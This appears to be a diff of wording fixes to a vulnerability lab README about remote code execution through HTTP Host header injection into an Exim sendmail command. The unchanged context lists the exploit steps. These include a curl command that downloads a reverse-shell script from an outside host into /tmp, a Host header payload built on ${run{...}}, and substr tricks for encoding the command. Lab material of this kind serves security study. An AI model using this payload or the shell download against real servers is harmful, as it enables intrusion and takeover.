@@ -13,7 +13,7 @@ docker-compose build
 docker-compose up -d
 ```
 
-Because Mysql initialization need a little time, so please wait. After initialization success, visit the site, set the administrator username and password to use it (the database is configured and not automatically updated).
+Because Mysql initialization needs a little time, so please wait. After initialization succeeds, visit the site, set the administrator username and password to use it (the database is configured and not automatically updated).
 
 ## Expliot
 
@@ -42,7 +42,7 @@ In order to solve these problems, the vulnerability author came up with $`substr
 
 However, there are still a lot of characters can't be used. So we need to put the command on the third-party website, and then download it to `/tmp` directory by `curl -o /tmp/rce example.com/shell.sh`.
 
-Therefore, the expliot process as follows:
+Therefore, the expliot process is follows:
 
 1. Write the exp of reverse shell and put it on a site. The exp have this following requirements:
  - the entire url's uppercase letters will be converted to lowercase, so the file path should not contain uppercase letters.
@@ -52,7 +52,7 @@ Therefore, the expliot process as follows:
 
 3. Convert the spaces and `/` in the command to `${substr{10}{1}{$tod_log}}` and `${substr{0}{1}{$spool_directory}}`.
 
-4. Spliced the HTTP Host header:`target(any -froot@localhost -be ${run{command}} null)`.
+4. Produce the HTTP Host header:`target(any -froot@localhost -be ${run{command}} null)`.
 
 5. Send these two packets in order.
 
